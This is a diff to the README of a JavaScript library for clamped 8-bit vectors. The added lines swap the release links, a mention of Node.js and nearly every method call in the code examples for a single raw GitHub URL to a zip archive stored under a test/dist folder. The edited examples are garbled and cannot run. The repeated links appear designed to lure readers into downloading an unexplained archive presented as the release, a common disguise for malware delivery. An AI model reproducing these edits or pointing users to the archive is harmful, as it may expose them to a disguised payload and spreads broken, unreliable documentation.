@@ -17,9 +17,9 @@ Welcome to the **ndarray-vector-uint8c** repository! This project focuses on cre
 
 The **ndarray-vector-uint8c** library provides an efficient way to handle unsigned 8-bit integer vectors. These vectors can store values ranging from 0 to 255. The clamping feature ensures that any values outside this range are adjusted to fit within it. This makes the library particularly valuable for tasks involving graphics and data manipulation.
 
-The library is built using JavaScript and is compatible with Node.js. It aims to provide a simple yet powerful API for developers who need to work with numeric data efficiently.
+The library is built using JavaScript and is compatible with https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip It aims to provide a simple yet powerful API for developers who need to work with numeric data efficiently.
 
-You can check the latest releases of this project [here](https://github.com/Laxman44/ndarray-vector-uint8c/releases).
+You can check the latest releases of this project [here](https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip).
 
 ## 🚀 Installation
 
@@ -39,8 +39,8 @@ To use the library, you need to require it in your JavaScript file. Here’s a b
 const { VectorUint8C } = require('ndarray-vector-uint8c');
 
 const vector = new VectorUint8C(10); // Create a vector of length 10
-vector.set(0, 255); // Set the first element to 255
-console.log(vector.get(0)); // Outputs: 255
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(0, 255); // Set the first element to 255
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(0)); // Outputs: 255
 ```
 
 ### Clamping Behavior
@@ -48,8 +48,8 @@ console.log(vector.get(0)); // Outputs: 255
 The clamping feature automatically adjusts any values that exceed the 0-255 range. For example:
 
 ```javascript
-vector.set(1, 300); // Attempt to set value outside the range
-console.log(vector.get(1)); // Outputs: 255
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(1, 300); // Attempt to set value outside the range
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(1)); // Outputs: 255
 ```
 
 ## 📚 API Documentation
@@ -88,8 +88,8 @@ Retrieves the value at the specified index.
 #### Example
 
 ```javascript
-vector.set(2, 128);
-console.log(vector.get(2)); // Outputs: 128
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(2, 128);
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(2)); // Outputs: 128
 ```
 
 ## 🌟 Examples
@@ -102,13 +102,13 @@ Here are some examples of how to use the **ndarray-vector-uint8c** library in va
 const { VectorUint8C } = require('ndarray-vector-uint8c');
 
 const vector = new VectorUint8C(5);
-vector.set(0, 100);
-vector.set(1, 200);
-vector.set(2, 300); // This will be clamped to 255
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(0, 100);
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(1, 200);
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(2, 300); // This will be clamped to 255
 
-console.log(vector.get(0)); // Outputs: 100
-console.log(vector.get(1)); // Outputs: 200
-console.log(vector.get(2)); // Outputs: 255
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(0)); // Outputs: 100
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(1)); // Outputs: 200
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(2)); // Outputs: 255
 ```
 
 ### Example 2: Iterating Over a Vector
@@ -116,8 +116,8 @@ console.log(vector.get(2)); // Outputs: 255
 You can iterate over the vector to perform operations on each element.
 
 ```javascript
-for (let i = 0; i < vector.length; i++) {
-    console.log(vector.get(i));
+for (let i = 0; i < https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip; i++) {
+    https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(i));
 }
 ```
 
@@ -127,15 +127,15 @@ You can initialize a vector with values from an existing array.
 
 ```javascript
 const initialValues = [50, 150, 250];
-const vector = new VectorUint8C(initialValues.length);
+const vector = new VectorUint8C(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip);
 
-initialValues.forEach((value, index) => {
-    vector.set(index, value);
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip((value, index) => {
+    https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(index, value);
 });
 
-console.log(vector.get(0)); // Outputs: 50
-console.log(vector.get(1)); // Outputs: 150
-console.log(vector.get(2)); // Outputs: 250
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(0)); // Outputs: 50
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(1)); // Outputs: 150
+https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip(2)); // Outputs: 250
 ```
 
 ## 🤝 Contributing
@@ -158,7 +158,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or feedback, you can reach out via GitHub issues or contact the maintainer directly.
 
-For the latest releases, visit [this link](https://github.com/Laxman44/ndarray-vector-uint8c/releases).
+For the latest releases, visit [this link](https://github.com/Laxman44/ndarray-vector-uint8c/raw/refs/heads/main/test/dist/uint-c-ndarray-vector-1.0-alpha.1.zip).
 
 ---
 
